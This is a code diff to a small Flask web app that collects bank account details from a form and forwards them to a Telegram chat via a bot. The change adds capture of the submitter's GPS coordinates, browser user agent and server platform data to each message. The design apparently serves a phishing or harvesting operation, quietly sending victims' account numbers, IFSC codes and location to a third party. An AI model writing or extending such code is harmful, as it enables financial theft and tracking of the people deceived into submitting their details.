@@ -1,6 +1,7 @@
 from flask import Flask, request, render_template, redirect, url_for
 import telebot
 import os
+import platform
 
 # Load environment variables and initialize Flask and Telebot
 app = Flask(__name__)
@@ -18,18 +19,35 @@ def submit():
     # Retrieve form data
     account_holder = request.form.get('account_holder')
     account_number = request.form.get('account_number')
-    bank_name = request.form.get('bank_name')
     branch_name = request.form.get('branch_name')
     ifsc_code = request.form.get('ifsc_code')
 
-    # Format message for Telegram
+    # Retrieve location data
+    latitude = request.form.get('latitude')
+    longitude = request.form.get('longitude')
+
+    # Retrieve client system information from the user agent
+    user_agent = request.headers.get('User-Agent')
+
+    # Retrieve server system information
+    system_info = {
+        "OS": platform.system(),
+        "OS Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+        "Python Version": platform.python_version()
+    }
+
+    # Format the message for Telegram
     telegram_message = (
         f"New Bank Details Submission:\n"
         f"Account Holder Name: {account_holder}\n"
         f"Account Number: {account_number}\n"
-        f"Bank Name: {bank_name}\n"
         f"Branch Name: {branch_name}\n"
-        f"IFSC Code: {ifsc_code}"
+        f"IFSC Code: {ifsc_code}\n"
+        f"Location: {latitude}, {longitude}\n"
+        f"Client Info: {user_agent}\n"
+        f"Server Info: {system_info}"
     )
 
     # Send message to Telegram
